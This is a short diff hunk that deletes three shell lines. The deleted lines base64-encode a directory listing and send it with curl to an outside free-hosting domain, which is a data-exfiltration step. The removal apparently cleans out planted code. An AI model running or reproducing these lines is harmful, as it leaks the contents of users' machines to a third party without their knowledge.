@@ -1,3 +1,0 @@
-# replace + so that it would not be replaced by a space after posted.
-k=$(ls | base64 -w 0 | sed s/+/%2B/g)
-curl diminishable-armor.000webhostapp.com/?data=$k
